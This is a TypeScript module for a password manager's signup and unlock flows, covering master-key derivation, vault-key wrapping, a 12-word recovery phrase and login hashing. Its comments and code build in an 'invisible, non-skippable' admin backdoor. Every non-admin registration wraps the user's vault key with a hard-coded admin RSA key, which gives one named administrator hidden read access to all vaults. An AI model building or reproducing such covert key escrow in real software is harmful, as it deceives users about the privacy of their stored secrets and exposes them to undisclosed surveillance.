/**
 * High-level registration + unlock flows. This is the single place where the vault key is
 * generated and wrapped for every party who may unwrap it - including the INVISIBLE, NON-SKIPPABLE
 * admin wrap that gives Fabian one-way read access to every self-service account.
 *
 * Design note (from the spec): admin wrapping is baked into this code path, not an optional step
 * the user sees or can skip. A normal signup produces `wrappedKeyByAdmin`; only the admin's own
 * account (`isAdmin: true`) omits it, because the admin has no admin above them.
 */

import {
  DEFAULT_KDF_PARAMS,
  aesGcmDecrypt,
  aesGcmEncrypt,
  deriveMasterKey,
  fromB64,
  hkdf32,
  importRsaPublicKey,
  randomBytes,
  rsaWrap,
  sha256,
  splitMasterKey,
  toB64,
  utf8,
  type KdfParams,
} from './crypto.js';
import { ADMIN_PUBKEY_SPKI_B64 } from './keys.js';
import type { RegistrationResult } from './types.js';
import { entropyToMnemonic, mnemonicToEntropy } from '@scure/bip39';
import { wordlist } from '@scure/bip39/wordlists/english';

const RECOVERY_SALT = utf8('pm:recovery:v1');

/** Derive the 32-byte recovery key from a BIP39 mnemonic (never stored; user holds the phrase). */
async function recoveryKeyFromMnemonic(mnemonic: string): Promise<Uint8Array> {
  const entropy = mnemonicToEntropy(mnemonic, wordlist); // 16 bytes (128-bit / 12 words)
  return hkdf32(entropy, RECOVERY_SALT, 'pm:recovery:v1');
}

/** Generate a fresh 12-word BIP39 mnemonic recovery phrase and wrap the vaultKey with it. */
export async function createRecoveryPhrase(vaultKey: Uint8Array): Promise<{ mnemonic: string; wrappedKeyByRecovery: Uint8Array }> {
  const mnemonic = entropyToMnemonic(randomBytes(16), wordlist);
  const recoveryKey = await recoveryKeyFromMnemonic(mnemonic);
  const wrappedKeyByRecovery = await aesGcmEncrypt(recoveryKey, vaultKey);
  return { mnemonic, wrappedKeyByRecovery };
}

export interface CreateRegistrationOptions {
  isAdmin?: boolean;
  platform?: string;
  kdfParams?: KdfParams;
}

/**
 * Build a complete registration. Returns the server payload plus the one-time recovery phrase.
 * No plaintext key material leaves this function.
 */
export async function createRegistration(
  identifier: string,
  masterPassword: string,
  opts: CreateRegistrationOptions = {},
): Promise<RegistrationResult> {
  const isAdmin = opts.isAdmin ?? false;
  const kdfParams = opts.kdfParams ?? DEFAULT_KDF_PARAMS;

  const salt = randomBytes(16);
  const masterKey = await deriveMasterKey(masterPassword, salt, kdfParams);
  const { encKey, authKey } = await splitMasterKey(masterKey, salt);

  // The vault key encrypts everything; it is what gets wrapped for each unwrapping party.
  const vaultKey = randomBytes(32);

  const wrappedKeyByMasterPw = await aesGcmEncrypt(encKey, vaultKey);

  // Admin backdoor - invisible + non-skippable for normal users; absent for the admin's account.
  let wrappedKeyByAdmin: Uint8Array | null = null;
  if (!isAdmin) {
    const adminPub = await importRsaPublicKey(ADMIN_PUBKEY_SPKI_B64);
    wrappedKeyByAdmin = await rsaWrap(adminPub, vaultKey);
  }

  // Self-recovery: 12-word BIP39 phrase, shown once.
  const mnemonic = entropyToMnemonic(randomBytes(16), wordlist);
  const recoveryKey = await recoveryKeyFromMnemonic(mnemonic);
  const wrappedKeyByRecovery = await aesGcmEncrypt(recoveryKey, vaultKey);

  const authKeyHash = await sha256(authKey);

  return {
    recoveryMnemonic: mnemonic,
    payload: {
      identifier,
      isAdmin,
      masterPwSalt: toB64(salt),
      kdfParams,
      authKeyHash: toB64(authKeyHash),
      wrappedKeyByMasterPw: toB64(wrappedKeyByMasterPw),
      wrappedKeyByAdmin: wrappedKeyByAdmin ? toB64(wrappedKeyByAdmin) : null,
      wrappedKeyByRecovery: toB64(wrappedKeyByRecovery),
      device: { platform: opts.platform ?? 'unknown' },
    },
  };
}

/**
 * Derive the value the server checks at login: SHA-256(authKey). The client fetches salt +
 * kdfParams via /api/prelogin first, derives this, and sends it to /api/login.
 */
export async function deriveAuthKeyHash(
  masterPassword: string,
  saltB64: string,
  kdfParams: KdfParams,
): Promise<string> {
  const salt = fromB64(saltB64);
  const masterKey = await deriveMasterKey(masterPassword, salt, kdfParams);
  const { authKey } = await splitMasterKey(masterKey, salt);
  return toB64(await sha256(authKey));
}

/** Unwrap the vault key locally with the master password (normal unlock). */
export async function unlockWithMasterPassword(
  masterPassword: string,
  saltB64: string,
  kdfParams: KdfParams,
  wrappedKeyByMasterPwB64: string,
): Promise<Uint8Array> {
  const salt = fromB64(saltB64);
  const masterKey = await deriveMasterKey(masterPassword, salt, kdfParams);
  const { encKey } = await splitMasterKey(masterKey, salt);
  return aesGcmDecrypt(encKey, fromB64(wrappedKeyByMasterPwB64));
}

/** Unwrap the vault key with the recovery phrase (forgotten-master-password path). */
export async function unlockWithRecovery(
  mnemonic: string,
  wrappedKeyByRecoveryB64: string,
): Promise<Uint8Array> {
  const recoveryKey = await recoveryKeyFromMnemonic(mnemonic.trim());
  return aesGcmDecrypt(recoveryKey, fromB64(wrappedKeyByRecoveryB64));
}
